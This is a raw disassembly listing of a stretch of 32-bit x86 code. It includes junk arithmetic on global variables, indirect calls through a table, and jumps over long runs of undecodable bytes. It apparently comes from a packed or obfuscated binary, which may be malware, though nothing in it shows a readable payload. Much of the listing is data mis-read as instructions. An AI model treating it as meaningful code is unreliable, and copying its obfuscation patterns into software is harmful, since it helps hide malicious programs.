  4136c2:	adc    DWORD PTR ds:0x4283c5,0x635d
  4136cc:	mov    DWORD PTR [ebp-0xc],eax
  4136cf:	cmp    DWORD PTR ds:0x428471,0x0
  4136d6:	mov    DWORD PTR ds:0x4282e5,0x6dcc
  4136e0:	mov    ecx,DWORD PTR ds:0x4283e1
  4136e6:	jmp    0x413753
  4136eb:	mov    DWORD PTR ds:0x42847d,0x2cf
  4136f5:	mov    DWORD PTR ds:0x428521,0x621d
  4136ff:	cmp    DWORD PTR ds:0x428471,0x0
  413706:	jbe    0x41373d
  41370c:	push   0x428471
  413711:	push   0x4283a5
  413716:	push   0x2216
  41371b:	call   DWORD PTR ds:0x42e258
  413721:	and    ecx,ecx
  413723:	mov    ecx,DWORD PTR ds:0x42834d
  413729:	mov    ecx,DWORD PTR [ecx]
  41372b:	add    DWORD PTR ds:0x42830d,ecx
  413731:	or     ecx,ecx
  413733:	sbb    DWORD PTR ds:0x42848d,0x6873
  41373d:	sbb    DWORD PTR ds:0x428495,ecx
  413743:	adc    DWORD PTR ds:0x428411,0x1149
  41374d:	or     DWORD PTR ds:0x428491,edx
  413753:	mov    eax,DWORD PTR [ebp-0x28]
  413756:	cmp    DWORD PTR ds:0x4283f5,0x0
  41375d:	mov    ecx,0xa9f
  413762:	mov    DWORD PTR ds:0x4283bd,0x1875
  41376c:	mov    DWORD PTR ds:0x428491,0x319d
  413776:	jmp    0x41383a
  41377b:	mov    DWORD PTR ds:0x428481,0x86c
  413785:	cmp    DWORD PTR ds:0x4283f5,0x0
  41378c:	jle    0x4137bf
  413792:	push   0x50b5
  413797:	call   DWORD PTR ds:0x42e25c
  41379d:	add    DWORD PTR ds:0x428305,0x737d
  4137a7:	sub    ecx,DWORD PTR ds:0x428491
  4137ad:	mov    ecx,DWORD PTR ds:0x428505
  4137b3:	xor    ecx,DWORD PTR ds:0x4283d1
  4137b9:	mov    DWORD PTR ds:0x428505,ecx
  4137bf:	inc    ecx
  4137c0:	movzx  ecx,BYTE PTR ds:0x428305
  4137c7:	sub    ecx,DWORD PTR ds:0x428471
  4137cd:	mov    DWORD PTR ds:0x428305,ecx
  4137d3:	cmp    DWORD PTR ds:0x4283ed,0x0
  4137da:	not    ecx
  4137dc:	mov    DWORD PTR ds:0x4283ad,0x5561
  4137e6:	jmp    0x41383a
  4137eb:	mov    DWORD PTR ds:0x428521,0x2772
  4137f5:	cmp    DWORD PTR ds:0x4283ed,0x0
  4137fc:	jle    0x41381e
  413802:	push   0x5196
  413807:	push   0x4281af
  41380c:	call   DWORD PTR ds:0x42e260
  413812:	sbb    DWORD PTR ds:0x428309,ecx
  413818:	xor    ecx,DWORD PTR ds:0x42851d
  41381e:	and    DWORD PTR ds:0x4283dd,edi
  413824:	inc    DWORD PTR ds:0x4283f1
  41382a:	add    DWORD PTR ds:0x4282f9,0x3293
  413834:	or     DWORD PTR ds:0x4283c5,ecx
  41383a:	mov    DWORD PTR [ebp-0x24],eax
  41383d:	mov    ecx,DWORD PTR [ebp-0x24]
  413840:	push   0x4
  413842:	sub    DWORD PTR ds:0x42847d,0x4aeb
  41384c:	pop    eax
  41384d:	sbb    DWORD PTR ds:0x4284fd,0x4282f9
  413857:	sub    eax,ecx
  413859:	cmp    DWORD PTR ds:0x428311,0x0
  413860:	mov    ecx,DWORD PTR ds:0x428491
  413866:	not    ecx
  413868:	movzx  ecx,BYTE PTR ds:0x4282e9
  41386f:	mov    ecx,DWORD PTR ds:0x428405
  413875:	jmp    0x4138c3
  41387a:	mov    DWORD PTR ds:0x428481,0x61cd
  413884:	cmp    DWORD PTR ds:0x428311,0x0
  41388b:	je     0x4138b5
  413891:	push   0x428485
  413896:	push   0x42827f
  41389b:	call   DWORD PTR ds:0x42e264
  4138a1:	or     DWORD PTR ds:0x428401,0x4283c5
  4138ab:	mov    DWORD PTR ds:0x4283c1,0x2055
  4138b5:	sub    ecx,DWORD PTR ds:0x4283fd
  4138bb:	or     ecx,DWORD PTR ds:0x4283ad
  4138c1:	neg    ecx
  4138c3:	mov    ecx,DWORD PTR [ebp-0x20]
  4138c6:	add    ecx,eax
  4138c8:	mov    DWORD PTR [ebp-0x30],ecx
  4138cb:	lea    eax,[ebp-0x3c]
  4138ce:	mov    DWORD PTR [ebp-0x38],eax
  4138d1:	mov    eax,DWORD PTR [ebp-0x18]
  4138d4:	mov    ecx,DWORD PTR [ebp-0x18]
  4138d7:	xor    eax,edi
  4138d9:	xor    ecx,ebx
  4138db:	shr    eax,0x2
  4138de:	shl    ecx,0x1e
  4138e1:	or     eax,ecx
  4138e3:	mov    DWORD PTR [ebp-0x2c],eax
  4138e6:	mov    DWORD PTR [ebp-0x8],0xa5069bbe
  4138ed:	mov    eax,DWORD PTR [ebp-0x8]
  4138f0:	mov    ecx,DWORD PTR [ebp-0x8]
  4138f3:	xor    eax,edi
  4138f5:	xor    ecx,ebx
  4138f7:	shr    eax,0x2
  4138fa:	shl    ecx,0x1e
  4138fd:	or     ecx,eax
  4138ff:	push   ecx
  413900:	lea    eax,[ebp-0x8]
  413903:	push   eax
  413904:	lea    eax,[ebp-0x80]
  413907:	push   eax
  413908:	call   0x411c08
  41390d:	mov    eax,DWORD PTR [ebp-0x8]
  413910:	mov    ecx,DWORD PTR [ebp-0x8]
  413913:	xor    eax,edi
  413915:	xor    ecx,ebx
  413917:	shr    eax,0x2
  41391a:	shl    ecx,0x1e
  41391d:	or     ecx,eax
  41391f:	push   ecx
  413920:	lea    eax,[ebp-0x24]
  413923:	push   eax
  413924:	mov    eax,DWORD PTR [ebp+0x8]
  413927:	mov    ecx,DWORD PTR [ebp+0xc]
  41392a:	shrd   eax,ecx,0x2
  41392e:	shr    ecx,0x2
  413931:	mov    ecx,DWORD PTR [ebp+0x8]
  413934:	mov    edx,DWORD PTR [ebp+0xc]
  413937:	xor    eax,esi
  413939:	xor    edx,edx
  41393b:	or     eax,edx
  41393d:	lea    eax,[ebp+eax*4-0x7c]
  413941:	push   eax
  413942:	shl    ecx,0x1e
  413945:	call   0x411c08
  41394a:	mov    eax,DWORD PTR [ebp-0x8]
  41394d:	mov    ecx,DWORD PTR [ebp-0x8]
  413950:	xor    eax,edi
  413952:	xor    ecx,ebx
  413954:	shr    eax,0x2
  413957:	shl    ecx,0x1e
  41395a:	or     ecx,eax
  41395c:	push   ecx
  41395d:	lea    eax,[ebp-0x30]
  413960:	push   eax
  413961:	jmp    0x413c9a
  413966:	in     eax,dx
  413967:	dec    edi
  413968:	ret    
  413969:	in     al,dx
  41396a:	fs jl  0x413963
  41396d:	pop    ebx
  41396e:	push   0x27e3e744
  413973:	repnz cli 
  413975:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413976:	in     al,dx
  413977:	xchg   BYTE PTR [esi-0x413b1242],bh
  41397d:	mov    esi,0x93b5acaf
  413982:	cmp    DWORD PTR [edi-0x4c],0x15afbc56
  413989:	ins    DWORD PTR es:[edi],dx
  41398a:	pop    esp
  41398b:	repnz xor al,0xb9
  41398e:	cmp    BYTE PTR [esp+ebx*8+0x29],dh
  413992:	mov    BYTE PTR [esi+0x49],cl
  413995:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413996:	pop    ebx
  413997:	xor    edx,DWORD PTR ds:0xca9484a0
  41399d:	push   edi
  41399e:	jns    0x41395c
  4139a0:	xchg   ecx,eax
  4139a1:	jp     0x413950
  4139a3:	mov    bl,0x43
  4139a5:	pop    edi
  4139a6:	jecxz  0x4139b5
  4139a8:	das    
  4139a9:	xchg   edi,eax
  4139aa:	mov    esi,0x289be1c0
  4139af:	pusha  
  4139b0:	or     eax,0xd8860cb9
  4139b5:	dec    ebp
  4139b6:	and    al,0xd1
  4139b8:	and    BYTE PTR [ecx],bl
  4139ba:	fidiv  WORD PTR [ebp+edi*1-0x6a]
  4139be:	lods   eax,DWORD PTR ds:[esi]
  4139bf:	fwait
  4139c0:	sahf   
  4139c1:	cli    
  4139c2:	jl     0x41397d
  4139c4:	popf   
  4139c5:	fadd   st(6),st
  4139c7:	inc    edx
  4139c8:	les    esi,FWORD PTR [edx]
  4139ca:	(bad)  
  4139cb:	sub    DWORD PTR [esi-0x2f263d2b],esp
  4139d1:	push   ebx
  4139d2:	cwde   
  4139d3:	leave  
  4139d4:	sub    DWORD PTR [edi],edi
  4139d6:	push   cs
  4139d7:	or     ebx,DWORD PTR [edx-0x4c]
  4139da:	pop    edx
  4139db:	and    al,BYTE PTR [ecx]
  4139dd:	mov    esp,0x8462b64a
  4139e2:	stos   BYTE PTR es:[edi],al
  4139e3:	sbb    bl,al
  4139e5:	dec    ebp
  4139e6:	cmp    cl,BYTE PTR [eax+0x40]
  4139e9:	pop    es
  4139ea:	int    0x86
  4139ec:	push   ebp
  4139ed:	mov    al,ds:0x3507cca1
  4139f2:	dec    edx
  4139f3:	dec    ecx
  4139f4:	pop    ss
  4139f5:	add    eax,0xe80db1b5
  4139fa:	xchg   ebx,eax
  4139fb:	push   ss
  4139fc:	pop    esp
  4139fd:	ins    BYTE PTR es:[edi],dx
  4139fe:	(bad)  
  413a00:	cmp    eax,0xddd9a759
  413a05:	xor    eax,DWORD PTR [ebp+edx*1+0x6bb02e9d]
  413a0c:	sub    esi,DWORD PTR [ebp+0x1090aae6]
  413a12:	jbe    0x4139b3
  413a14:	clc    
  413a15:	(bad)  
  413a16:	dec    eax
  413a17:	cmp    BYTE PTR [ebp+0x55ee5190],dl
  413a1d:	and    al,0x2f
  413a1f:	les    edx,FWORD PTR [edi+0x1eb58e9e]
  413a25:	push   ss
  413a26:	sub    bh,BYTE PTR [edx]
  413a28:	add    eax,0x905101d4
  413a2d:	jg     0x413a69
  413a2f:	adc    eax,0x3150699a
  413a34:	call   0xef011ead
  413a39:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413a3a:	not    bl
  413a3c:	sbb    bh,BYTE PTR [eax+0x17e89134]
  413a42:	pop    ecx
  413a43:	int    0x1c
  413a45:	(bad)  
  413a47:	std    
  413a48:	mov    bl,0xd7
  413a4a:	jo     0x413ac2
  413a4c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413a4d:	or     al,0x92
  413a4f:	jae    0x413a86
  413a51:	xor    eax,0x16f83cb8
  413a56:	test   al,0x37
  413a58:	pop    ss
  413a59:	mov    dl,BYTE PTR [eax+0x22d7f443]
  413a5f:	fs pop ebx
  413a61:	(bad)  
  413a62:	fimul  DWORD PTR [ebp+0x428c30af]
  413a68:	test   eax,0xed6bb714
  413a6d:	retf   
  413a6e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413a6f:	ins    DWORD PTR es:[edi],dx
  413a70:	arpl   WORD PTR [ecx],ax
  413a72:	fwait
  413a73:	(bad)  
  413a74:	fstp   TBYTE PTR [esi-0x4e]
  413a77:	rcl    al,1
  413a79:	(bad)  
  413a7a:	jg     0x413a59
  413a7c:	jns    0x413a76
  413a7e:	js     0x413a44
  413a80:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413a81:	add    cl,bl
  413a83:	push   cs
  413a84:	stos   DWORD PTR es:[edi],eax
  413a85:	add    dl,BYTE PTR [eax]
  413a87:	inc    eax
  413a88:	push   0xffffffa1
  413a8a:	push   edi
  413a8b:	mov    bl,0x44
  413a8d:	loopne 0x413af4
  413a8f:	and    BYTE PTR [edx-0x5c109d63],0x24
  413a96:	mov    ch,BYTE PTR [eax]
  413a98:	ins    DWORD PTR es:[edi],dx
  413a99:	(bad)  
  413a9b:	ins    BYTE PTR es:[edi],dx
  413a9c:	jb     0x413a8c
  413a9e:	jb     0x413b03
  413aa0:	sbb    DWORD PTR [esp+ebx*8-0x76],ecx
  413aa4:	rol    DWORD PTR [ebp+0x70c9abee],0xd0
  413aab:	enter  0x2985,0x40
  413aaf:	mov    BYTE PTR [edx],0x29
  413ab2:	pop    ds
  413ab3:	add    BYTE PTR [edx+0x32],ch
  413ab6:	arpl   WORD PTR [ecx-0x49],si
  413ab9:	mov    eax,0x4b8115d5
  413abe:	(bad)  
  413abf:	xchg   esi,eax
  413ac0:	leave  
  413ac1:	xchg   edi,eax
  413ac2:	dec    esi
  413ac3:	push   ebp
  413ac4:	cli    
  413ac5:	lea    eax,fs:0x431f2a58
  413acc:	sbb    esi,ecx
  413ace:	jo     0x413ad9
  413ad0:	scas   eax,DWORD PTR es:[edi]
  413ad1:	cli    
  413ad2:	mov    dh,0x84
  413ad4:	or     al,0x9c
  413ad6:	stc    
  413ad7:	cmp    BYTE PTR [ecx+ebx*2+0x1d],0x8
  413adc:	mov    al,ds:0x65247513
  413ae1:	and    ah,BYTE PTR [ebx+eiz*2-0x4b008a1c]
  413ae8:	dec    ebp
  413ae9:	hlt    
  413aea:	dec    edi
  413aeb:	ins    BYTE PTR es:[edi],dx
  413aec:	cwde   
  413aed:	push   edi
  413aee:	mov    esi,0x62ba8cb8
  413af3:	mov    ch,0xa5
  413af5:	xchg   ecx,eax
  413af6:	dec    eax
  413af7:	lods   eax,DWORD PTR ds:[esi]
  413af8:	fadd   DWORD PTR [ecx]
  413afa:	pushf  
  413afb:	adc    ebx,DWORD PTR [ebp+edx*8-0x217b6617]
  413b02:	call   0xf8e9:0x81f7486b
  413b09:	into   
  413b0a:	push   edx
  413b0b:	jae    0x413b36
  413b0d:	sar    BYTE PTR ds:0x458da289,1
  413b13:	xor    DWORD PTR [edx],0xac5b5bc5
  413b19:	sahf   
  413b1a:	jae    0x413b4f
  413b1c:	rol    BYTE PTR [esi+0x62],cl
  413b1f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413b20:	mov    dl,0xb
  413b22:	aaa    
  413b23:	out    dx,eax
  413b24:	int3   
  413b25:	mov    edi,0xd4d7504d
  413b2a:	and    esp,edi
  413b2c:	pop    ecx
  413b2d:	icebp  
  413b2e:	mov    al,ds:0x103d01f8
  413b33:	repz aaa 
  413b35:	(bad)  
  413b36:	push   ss
  413b37:	sbb    DWORD PTR [edx+0x55a45244],0xffffffd9
  413b3e:	mov    dl,0xa7
  413b40:	aad    0x17
  413b42:	inc    ebp
  413b43:	faddp  st(7),st
  413b45:	cwde   
  413b46:	pusha  
  413b47:	test   eax,0x53ab20c1
  413b4c:	jnp    0x413b1e
  413b4e:	loopne 0x413ae8
  413b50:	int    0xe8
  413b52:	mov    esp,0x5769f2b9
  413b57:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413b58:	jnp    0x413bba
  413b5a:	jmp    0x413b06
  413b5c:	inc    edx
  413b5d:	or     BYTE PTR [ebp+eiz*1-0x4],dh
  413b61:	das    
  413b62:	lods   eax,DWORD PTR ds:[esi]
  413b63:	fisttp QWORD PTR [esi+0x6fdb4c44]
  413b69:	and    BYTE PTR [ebp+0x2e9657d2],dh
  413b6f:	push   edi
  413b70:	cmp    DWORD PTR [edx-0x75],0xffffffd2
  413b74:	or     eax,0x735fc8ba
  413b79:	and    esp,ebp
  413b7b:	push   eax
  413b7c:	xchg   edi,eax
  413b7d:	nop
  413b7e:	mov    eax,ds:0xf82d120a
  413b83:	mov    al,0x8d
  413b85:	jae    0x413be4
  413b87:	dec    edx
  413b88:	push   eax
  413b89:	shl    BYTE PTR [edi],cl
  413b8b:	mov    al,ds:0x8a6c9b36
  413b90:	dec    ebp
  413b91:	arpl   WORD PTR [ebp-0xc],bp
  413b94:	out    dx,eax
  413b95:	iret   
  413b96:	mov    al,dh
  413b98:	fsub   QWORD PTR [eax-0x70]
  413b9b:	xor    ebp,edx
  413b9d:	jl     0x413b43
  413b9f:	pop    edi
  413ba0:	sub    DWORD PTR [edi+0x72],0x78
  413ba4:	hlt    
  413ba5:	je     0x413b30
  413ba7:	(bad)
  413bab:	pop    ecx
  413bac:	retf   0xcbc2
  413baf:	mov    edx,0xc97ece
  413bb4:	jge    0x413bcb
  413bb6:	mov    eax,0x7bc6fbb0
  413bbb:	fiadd  WORD PTR [esi-0x4f]
  413bbe:	out    0xbc,eax
  413bc0:	retf   
  413bc1:	out    0xed,eax
  413bc3:	sub    DWORD PTR [edi-0x7af8de0b],0xc47bf91f
  413bcd:	mov    bh,0x98
  413bcf:	aaa    
  413bd0:	cmp    DWORD PTR [esi+0x28358669],edx
  413bd6:	jns    0x413b70
  413bd8:	ja     0x413c25
  413bda:	inc    ebp
  413bdb:	mov    edx,0xc10de29e
  413be0:	xlat   BYTE PTR ds:[ebx]
  413be1:	and    eax,0x3bcc776a
  413be6:	add    DWORD PTR [esi-0x3594ca2a],edi
  413bec:	jmp    0x990b:0x227681ec
  413bf3:	xor    eax,0x5e2fad36
  413bf8:	ret    
  413bf9:	jmp    DWORD PTR [ebp+0x2a]
  413bfc:	mov    WORD PTR [ecx+eax*4+0x748aad66],gs
  413c03:	mov    al,ds:0x6525dae0
  413c08:	or     edi,DWORD PTR fs:[edx+0x38]
  413c0c:	cmp    DWORD PTR [edi-0xa],ebx
  413c0f:	test   al,0xc6
  413c11:	scas   al,BYTE PTR es:[edi]
  413c12:	jle    0x413c39
  413c14:	aam    0x8a
  413c16:	adc    ah,BYTE PTR [ebx+0x7e2b122b]
  413c1c:	in     al,dx
  413c1d:	pop    edi
  413c1e:	xor    eax,0xf7ec8fcf
  413c23:	repz jl 0x413c7c
  413c26:	stos   DWORD PTR es:[edi],eax
  413c27:	add    al,bl
  413c29:	push   0xf007e60f
  413c2e:	mov    DWORD PTR [eax],ecx
  413c30:	test   eax,0xc79c368f
  413c35:	mov    al,0xe5
  413c37:	xchg   ebp,eax
  413c38:	int3   
  413c39:	nop
  413c3a:	aaa    
  413c3b:	adc    edi,DWORD PTR [edi]
  413c3d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413c3e:	lea    edx,ds:0x692d936
  413c44:	fisub  WORD PTR [esi+0x39a86b6b]
  413c4a:	arpl   si,bx
  413c4c:	pop    ebx
  413c4d:	fstp   DWORD PTR [esi-0x300df55]
  413c53:	sub    DWORD PTR [ebp+0x15],ecx
  413c56:	inc    esp
  413c57:	jl     0x413bf8
  413c59:	inc    edi
  413c5a:	enter  0x7b53,0x37
  413c5e:	retf   0x8a69
  413c61:	xor    bl,bh
  413c63:	lods   al,BYTE PTR ds:[esi]
  413c64:	mov    esi,DWORD PTR [ebx]
  413c66:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413c67:	neg    BYTE PTR [eax-0x65]
  413c6a:	ss rol bl,0x85
  413c6e:	add    eax,0xdc93711b
  413c73:	cmc    
  413c74:	jg     0x413cab
  413c76:	stos   DWORD PTR es:[edi],eax
  413c77:	or     bl,BYTE PTR [ecx+0x1490b870]
  413c7d:	push   ebp
  413c7e:	stos   BYTE PTR es:[edi],al
  413c7f:	shl    BYTE PTR [ebx-0x17],1
  413c82:	mov    esi,0x731d2cdf
  413c87:	mov    ebp,DWORD PTR [ecx+0x53a5f7cd]
  413c8d:	add    ecx,edi
  413c8f:	push   DWORD PTR [ebp-0x49]
  413c92:	pop    edi
  413c93:	jge    0x413cb0
  413c95:	add    al,0xa
  413c97:	dec    esi
  413c98:	fstp   DWORD PTR [edi-0x75]
  413c9b:	inc    ebp
  413c9c:	adc    BYTE PTR [ebx-0x53f0ebb3],cl
  413ca2:	enter  0xc102,0xe9
  413ca6:	add    cl,BYTE PTR [ebx+0x558b104d]
  413cac:	adc    al,0x33
  413cae:	(bad)  
  413caf:	xor    edx,edx
  413cb1:	or     eax,edx
  413cb3:	lea    eax,[ebp+eax*4-0x7c]
  413cb7:	push   eax
  413cb8:	shl    ecx,0x1e
  413cbb:	call   0x411c08
  413cc0:	mov    eax,DWORD PTR [ebp-0x8]
  413cc3:	mov    ecx,DWORD PTR [ebp-0x8]
  413cc6:	xor    ecx,ebx
  413cc8:	xor    eax,edi
  413cca:	shl    ecx,0x1e
  413ccd:	shr    eax,0x2
  413cd0:	or     ecx,eax
  413cd2:	push   ecx
  413cd3:	lea    eax,[ebp-0x2c]
  413cd6:	push   eax
  413cd7:	mov    eax,DWORD PTR [ebp+0x10]
  413cda:	mov    ecx,DWORD PTR [ebp+0x14]
  413cdd:	shrd   eax,ecx,0x2
  413ce1:	shr    ecx,0x2
  413ce4:	mov    ecx,DWORD PTR [ebp+0x10]
  413ce7:	mov    edx,DWORD PTR [ebp+0x14]
  413cea:	xor    edx,edx
  413cec:	xor    eax,esi
  413cee:	or     eax,edx
  413cf0:	shl    ecx,0x1e
  413cf3:	mov    ecx,DWORD PTR [ebp+0x10]
  413cf6:	mov    edx,DWORD PTR [ebp+0x14]
  413cf9:	shrd   ecx,edx,0x2
  413cfd:	shr    edx,0x2
  413d00:	mov    edx,DWORD PTR [ebp+0x10]
  413d03:	mov    ebx,DWORD PTR [ebp+0x14]
  413d06:	xor    ecx,esi
  413d08:	xor    ebx,ebx
  413d0a:	or     ecx,ebx
  413d0c:	add    eax,ecx
  413d0e:	lea    eax,[ebp+eax*4-0x7c]
  413d12:	push   eax
  413d13:	shl    edx,0x1e
  413d16:	call   0x411c08
  413d1b:	mov    eax,DWORD PTR [ebp-0x8]
  413d1e:	mov    ecx,DWORD PTR [ebp-0x8]
  413d21:	xor    ecx,0xfffffffe
  413d24:	shl    ecx,0x1e
  413d27:	xor    eax,edi
  413d29:	shr    eax,0x2
  413d2c:	or     ecx,eax
  413d2e:	push   ecx
  413d2f:	lea    eax,[ebp-0x38]
  413d32:	push   eax
  413d33:	mov    eax,DWORD PTR [ebp+0x10]
  413d36:	mov    ecx,DWORD PTR [ebp+0x14]
  413d39:	shrd   eax,ecx,0x2
  413d3d:	shr    ecx,0x2
  413d40:	jmp    0x414079
  413d45:	lock aad 0x95
  413d48:	dec    ecx
  413d49:	mov    bh,0x8a
  413d4b:	xor    al,0x7c
  413d4d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413d4e:	cmp    eax,0x11ecdd72
  413d53:	lock iret 
  413d55:	sbb    ecx,DWORD PTR [esi+edi*4-0x413b1242]
  413d5c:	mov    esi,0xc3812b9e
  413d61:	(bad)  
  413d62:	std    
  413d63:	xchg   DWORD PTR [ebx],ebp
  413d65:	xchg   edi,eax
  413d66:	(bad)  [ebp+0x4c57bce0]
  413d6c:	pcmpeqw mm7,mm4
  413d6f:	and    BYTE PTR [esp+ecx*8],0xd4
  413d73:	xor    edi,DWORD PTR [edx]
  413d75:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413d76:	cmp    al,0x71
  413d78:	adc    al,0xd7
  413d7a:	xchg   edi,eax
  413d7b:	scas   al,BYTE PTR es:[edi]
  413d7c:	cmp    DWORD PTR ds:0x8d4a9624,edx
  413d82:	idiv   BYTE PTR [eax]
  413d84:	inc    esi
  413d85:	pusha  
  413d86:	jl     0x413dc5
  413d88:	xor    eax,0x818ad914
  413d8d:	(bad)  
  413d8e:	outs   dx,BYTE PTR ds:[esi]
  413d8f:	fwait
  413d90:	test   al,0x89
  413d92:	or     eax,0xc3815f7d
  413d97:	inc    edx
  413d98:	mov    esp,0x1b267380
  413d9d:	out    0x5e,eax
  413d9f:	in     al,0x3c
  413da1:	push   0x3229205e
  413da6:	or     DWORD PTR [ecx+0x40062479],ebp
  413dac:	in     eax,dx
  413dad:	mov    ds:0xf9e250f6,eax
  413db2:	jae    0x413db2
  413db4:	jecxz  0x413d72
  413db6:	xor    DWORD PTR [edi+0x6baaccce],esi
  413dbc:	ins    DWORD PTR es:[edi],dx
  413dbd:	pop    ebx
  413dbe:	mov    eax,0x8d252b57
  413dc3:	xchg   ebx,eax
  413dc4:	adc    ch,BYTE PTR [ecx]
  413dc6:	cmp    DWORD PTR [edx],ebx
  413dc8:	and    cl,BYTE PTR [esi+0xf55c97a]
  413dce:	jns    0x413d9e
  413dd0:	pusha  
  413dd1:	or     ebx,ecx
  413dd3:	repz out 0x56,al
  413dd6:	and    al,0x1c
  413dd8:	les    ebx,FWORD PTR [eax-0x3a8c469]
  413dde:	sub    DWORD PTR [ecx],ebp
  413de0:	xchg   edi,eax
  413de1:	mov    ebp,0xde545ef7
  413de6:	xor    eax,0x2c86cc1f
  413deb:	loope  0x413e11
  413ded:	das    
  413dee:	fwait
  413def:	push   cs
  413df0:	dec    ebp
  413df1:	dec    ecx
  413df2:	pop    edx
  413df3:	mov    ebx,0x1fe068c3
  413df8:	retf   0x7b17
  413dfb:	enter  0xa12c,0x7
  413dff:	or     ebp,DWORD PTR [eax]
  413e01:	out    0xa5,al
  413e03:	ins    BYTE PTR es:[edi],dx
  413e04:	clc    
  413e05:	inc    esp
  413e06:	(bad)  
  413e07:	ror    BYTE PTR [edi+0x3c],1
  413e0a:	fs jp  0x413dc0
  413e0d:	mov    dh,0x56
  413e0f:	lock or ebp,DWORD PTR [esi+0x304c88fc]
  413e16:	mov    BYTE PTR [edi-0x50],0x18
  413e1a:	jmp    0xac9c3e4f
  413e1f:	push   es
  413e20:	gs xchg esi,eax
  413e22:	lds    esp,FWORD PTR [ebx-0x6e0a24d8]
  413e28:	int3   
  413e29:	cmc    
  413e2a:	cmp    DWORD PTR [eax-0x7b71722e],edx
  413e30:	adc    esi,esi
  413e32:	sub    eax,0xf6a05bee
  413e37:	hlt    
  413e38:	add    esp,DWORD PTR [eax]
  413e3a:	jne    0x413e50
  413e3c:	and    edi,DWORD PTR [esi+0x5e5af598]
  413e42:	mov    ebp,DWORD PTR [ebp-0x13]
  413e45:	shr    BYTE PTR [eax],cl
  413e47:	inc    ebp
  413e48:	(bad)  
  413e49:	dec    ebp
  413e4a:	cmc    
  413e4b:	ins    DWORD PTR es:[edi],dx
  413e4c:	cmp    BYTE PTR [edi],cl
  413e4e:	std    
  413e4f:	push   0xc
  413e51:	call   DWORD PTR [edi]
  413e53:	out    0x51,al
  413e55:	xchg   BYTE PTR [ebx-0x51],cl
  413e58:	sbb    ah,BYTE PTR [edx]
  413e5a:	adc    BYTE PTR [ecx],cl
  413e5c:	pop    es
  413e5d:	push   ebx
  413e5e:	add    eax,0x5bfba6fa
  413e63:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413e64:	loopne 0x413ed9
  413e66:	aas    
  413e67:	push   esp
  413e68:	lds    edi,FWORD PTR [edx]
  413e6a:	and    eax,0xffff45d2
  413e6f:	jl     0x413ecb
  413e71:	inc    edx
  413e72:	outs   dx,DWORD PTR ds:[esi]
  413e73:	pop    esp
  413e74:	sub    BYTE PTR [esi],ch
  413e76:	mov    cl,0xfe
  413e78:	xchg   esi,esp
  413e7a:	add    DWORD PTR [ebp+0x16a8ed9d],esi
  413e80:	ret    0xe69
  413e83:	mov    ss,WORD PTR [ecx]
  413e85:	xor    edi,DWORD PTR ds:0xc6e9ed4b
  413e8b:	cli    
  413e8c:	mov    ebx,0x1ace3e4f
  413e91:	fcom   DWORD PTR [ebp-0x4b6cace7]
  413e97:	test   DWORD PTR [esi+ecx*2],ebp
  413e9a:	push   esp
  413e9b:	fbstp  TBYTE PTR [ecx+edx*2]
  413e9e:	addr16 in eax,dx
  413ea0:	outs   dx,BYTE PTR ds:[esi]
  413ea1:	add    eax,0x7534e246
  413ea6:	in     al,0x3f
  413ea8:	shr    BYTE PTR [ebp-0x15],cl
  413eab:	test   eax,0xd96a5630
  413eb0:	fbld   TBYTE PTR [edx+0x12]
  413eb3:	cwde   
  413eb4:	addr16 xchg esp,eax
  413eb6:	mov    ?,WORD PTR [esi+0x0]
  413eb9:	les    edx,FWORD PTR [esi+0x3015346e]
  413ebf:	test   esp,esp
  413ec1:	sbb    eax,0xcab2f004
  413ec6:	pop    es
  413ec7:	xor    eax,0x3e013d7
  413ecc:	leave  
  413ecd:	not    DWORD PTR [edx+0x1c]
  413ed0:	push   ss
  413ed1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413ed2:	in     eax,0xcb
  413ed4:	(bad)  
  413ed5:	jae    0x413e6b
  413ed7:	retf   0xc010
  413eda:	(bad)  
  413edb:	pop    es
  413edc:	and    eax,0x855afebe
  413ee1:	test   BYTE PTR ds:0x533dd028,0xab
  413ee8:	and    DWORD PTR [edx],esi
  413eea:	mov    WORD PTR ds:0xf05552,?
  413ef0:	pop    ss
  413ef1:	sub    bl,dh
  413ef3:	and    eax,0x788d43b5
  413ef8:	stc    
  413ef9:	ins    DWORD PTR es:[edi],dx
  413efa:	psraw  mm1,QWORD PTR fs:[ebx]
  413efe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413eff:	leave  
  413f00:	es stc 
  413f02:	dec    edx
  413f03:	xchg   esp,eax
  413f04:	rcl    DWORD PTR [edi+0x44],0xb3
  413f08:	call   0x8ee6bbb6
  413f0d:	das    
  413f0e:	cs jbe 0x413f74
  413f11:	pop    esi
  413f12:	nop
  413f13:	jl     0x413f3d
  413f15:	sbb    DWORD PTR [ecx],edx
  413f17:	push   edx
  413f18:	push   0x7f
  413f1a:	aad    0xd5
  413f1c:	in     al,0xd9
  413f1e:	push   es
  413f1f:	icebp  
  413f20:	mov    bh,0x2b
  413f22:	push   DWORD PTR [ecx+0x5c4321f6]
  413f28:	and    al,bl
  413f2a:	retf   0x10fc
  413f2d:	stos   DWORD PTR es:[edi],eax
  413f2e:	int3   
  413f2f:	pushf  
  413f30:	adc    DWORD PTR [esi+0x425e1c56],esi
  413f36:	scas   al,BYTE PTR es:[edi]
  413f37:	inc    ebp
  413f38:	xlat   BYTE PTR ds:[ebx]
  413f39:	stc    
  413f3a:	mov    ecx,0xb81e8c15
  413f3f:	dec    esi
  413f40:	pop    ds
  413f41:	es jno 0x413f4b
  413f44:	mov    esi,0xca437b69
  413f49:	in     eax,dx
  413f4a:	(bad)  
  413f4b:	(bad)  [esi-0x1df38065]
  413f51:	mov    WORD PTR [esi],?
  413f53:	jmp    0xa580b831
  413f58:	jle    0x413efc
